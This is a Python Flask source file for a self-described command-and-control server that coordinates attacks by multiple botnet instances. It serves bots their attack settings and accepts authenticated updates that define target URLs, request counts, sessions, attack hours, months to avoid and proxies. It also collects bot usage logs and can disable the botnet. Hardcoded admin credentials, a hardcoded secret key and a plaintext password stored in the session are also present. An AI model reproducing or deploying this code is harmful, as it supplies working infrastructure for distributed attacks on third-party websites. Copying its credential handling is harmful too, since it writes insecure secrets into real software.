from flask import Flask
from flask import request
from flask import render_template
from flask import session
from flask import abort
from CCServer import CCServer
from os import urandom

import logging
from time import time
from collections import OrderedDict
from logging.handlers import RotatingFileHandler
from datetime import datetime 

app = Flask(__name__)

"""
This is a simple implementation of a micro Command-and-Control Server using Flask. 
Its purpose is to provide a lightweight and simple interface to coordinate an attack carried
by multiple botnet instances, ideally deployed 'round-the-clock'

(please note that in this implementation the server handles just one request at a time - flask default)
"""

# log file path
logPath      = './data/ccserver.log'

# parameters for CC instance
settingsPath = './data/settings.json'
credentialsD = {
    'admin_usr' : "fsociety",
    'admin_pwd' : "steelmountain"
}
# creating CC instance
CC = CCServer(settingsPath, credentialsD)

app.secret_key = "\x9b\x17\xc4\xbc\x11\xed\xdcf\xa1\x9aV\xde\xafR\x93h\x81(\x8f|\xbeE\xd5\x08"



# ROUTING SERVER - settings retrieval 
@app.route('/settings', methods=['GET'])
def getSettings():
    # retrieving settings
    settings = CC.retrieveSettings()
    # logging the request
    app.logger.info("[{0}] => reached by {1} : configuration update required".format(str(datetime.utcnow()), request.remote_addr))

    return settings, 200

@app.route('/', methods=['GET','POST'])
def mainAccess():
    if (request.method == 'POST'):
        return login(request.form['u'],request.form['p'])
    else:
        return render_template("loginpage.html")

def login(username,password):
    if CC.authenticate({'auth_usr': username, 'auth_pwd': password}):
        session['username'] = username
        session['password'] = password
        return render_template("controlpage.html")
    else:
        return abort(403)

# ROUTING SERVER - update settings 
@app.route('/update', methods=['POST'])
def updateSettings():
    # retrieving username and password
    auth = request.authorization
    if CC.authenticate({ 'auth_usr'  : auth.username, 'auth_pwd' : auth.password }):
        # if user is correctly authenticated we can performe update op.
        try:
            CC.updateSettings(prepareConfigFile(request.json['settings']))
            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Override succeded", 200
        except TypeError as error:
            # if settings is missing as a param... update cannot be carried on
            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Bad request, override failure", 400

    else:
        # if user was not authenticated properly, we log the event and return a forbidden status
        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
        return "Forbidden!", 403


def prepareConfigFile(params, where='./data/current_attack.json'):

        localRootSchema = dict()

        # Only the useful key values will be changed accordingly
        localRootSchema['last_modified'] = round(time())
        localRootSchema['cc_server'] = params['cc_server'] if 'cc_server' in params else ""
        localRootSchema['log_file'] = './data/log.txt'
        localRootSchema['user-agent_b'] = "PROVETTA"
        localRootSchema['targets'] = []

        # Creation of the requestSchema
        for elem in params['target']:
            # Creation of the locaTargetSchema based upon the TargetSchema
            localTargetSchema = dict()
            localTargetSchema['sessions'] = int(elem['sessions']) if 'sessions' in elem else 1
            localTargetSchema['max_count'] = int(elem['max_count']) if 'max_count' in elem else 15

            if elem['min_period'] == "" or elem['max_period'] == "":
                localTargetSchema['period'] = ""
            else:
                localTargetSchema['period'] = elem['min_period'] + "-" + elem['max_period']

            # Creation of the actionCondition dictionary
            actionConditions = OrderedDict()

            # If AMPM has been choosen both AM and PM will be set on 1
            ampm = elem['AMPM'] if 'AMPM' in elem else ""
            if ampm == "AM":
                actionConditions['AM'] = 1
                actionConditions['PM'] = 0
            if ampm == "PM":
                actionConditions['AM'] = 0
                actionConditions['PM'] = 1
            if ampm == "AMPM":
                actionConditions['AM'] = 1
                actionConditions['PM'] = 1
            if elem['hour_start'] == "" or elem['hour_end'] == "":
                actionConditions['attack_time'] = ""
            else:
                actionConditions['attack_time'] = elem['hour_start'] + "-" + elem['hour_end']

            if 'avoid_month' in elem:
                if isinstance(elem['avoid_month'], list):
                    actionConditions['avoid_month'] = elem['avoid_month']
                else:
                    actionConditions['avoid_month'] = [elem['avoid_month']]
            else:
                actionConditions['avoid_month'] = []

            if 'avoid_week' in elem:
                if isinstance(elem['avoid_week'], list):
                    actionConditions['avoid_week'] = elem['avoid_week']
                else:
                    actionConditions['avoid_week'] = [elem['avoid_week']]
            else:
                actionConditions['avoid_week'] = []

            # ActionConditions is now part of the localTargetSchema
            localTargetSchema['action_conditions'] = actionConditions

            localRequestSchema = dict()
            localRequestSchema['method'] = elem['method'] if 'method' in elem else ""
            localRequestSchema['url'] = elem['url'] if 'url' in elem else ""

            if 'resources' in elem:
                if isinstance(elem['resources'], list):
                    for res in elem['resources']:
                        if res[0] != "/":
                            res = "/" + res
                    localRequestSchema['resources'] = elem['resources']
                else:
                    if elem['resources'][0] != "/":
                        elem['resources'] = "/" + elem['resources']
                    localRequestSchema['resources'] = [elem['resources']]
            else:
                localRequestSchema['resources'] = ["/"]

            localRequestSchema['encoding'] = elem['encoding'] if 'encoding' in elem else ""

            # Creation of the proxy dictionary
            proxy = OrderedDict()

            # If an element has been specified as https, it will be handeld properly
            if ('proxy' in elem):
                for proxy_elem in elem['proxy']:
                    if "https://" in proxy_elem:
                        proxy['https'] = proxy_elem
                    else:
                        proxy['http'] = proxy_elem
            else:
                proxy['https'] = ''
                proxy['http'] = ''

            # Proxy is now part of localRequestSchema
            localRequestSchema['proxy_server'] = proxy

            # Final combination of the three schemas
            localTargetSchema['request_params'] = localRequestSchema
            localRootSchema['targets'].append(localTargetSchema)

        return localRootSchema

# ROUTING SERVER - logs visualization (debug purposes)
@app.route('/logs', methods=['GET'])
def getLog():
    # simply returning log lines from logging file
    # splitting usage info 
    usageinfo = "" 
    logresult = "<h3> C&C SERVER LOGS / {0} </h3> </br>".format(str(datetime.utcnow()))
    
    with open(logPath) as logFile:
        for entry in logFile.readlines():
            if "usage" in entry:
                usageinfo += entry + "</br>"
            else:
                logresult += entry + "</br>"
    
    if len(usageinfo) != 0:
        logresult += "</br></br>"
        logresult += "<h3> USAGE STATS </h3> </br>"
        logresult += usageinfo

    return logresult, 200


# ROUTING SERVER - logs visualization (debug purposes)
@app.route('/botnetlogs', methods=['POST'])
def addBotnetLogs():
    # retrieving from post and formatting entries
    botnet = request.form['botnet']
    log    = request.form['log']
    # polishing log
    if len(log) != 1:
        app.logger.info("[{0}] => reached by botnet {1} - usage: {2}".format(str(datetime.utcnow()), str(botnet), str(log)))
    
    return "OK", 200


# ROUTING SERVER - disable the botnet via C&C
@app.route('/disable', methods=['POST'])
def disableBotnet():
    # retrieving username and password
    auth = request.authorization
    if CC.authenticate({ 'auth_usr'  : auth.username, 'auth_pwd' : auth.password }):
        # if user is correctly authenticated we can performe update op.
        try:
            CC.updateSettings({}, enable=False)
            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Botnet disabled!", 200
        except KeyError as error:
            # if settings is missing as a param... update cannot be carried on
            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
            return "Bad request, botnet disable failure", 400
    else:
        # if user was not authenticated properly, we log the event and return a forbidden status
        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
        return "Forbidden!", 403


# ---------------------------------------------------------------------#
#                      SERVER START UP ROUTINE                         #
# ---------------------------------------------------------------------#
if __name__ == "__main__": 
    # adding log handler provided by werkzeug lib ... 
    handler = RotatingFileHandler(logPath, maxBytes=10000, backupCount=1)
    # ... but first we need to set log level! 
    handler.setLevel(logging.INFO)
    logging.basicConfig(level=logging.INFO)
    app.logger.addHandler(handler)

    # running server
    app.run()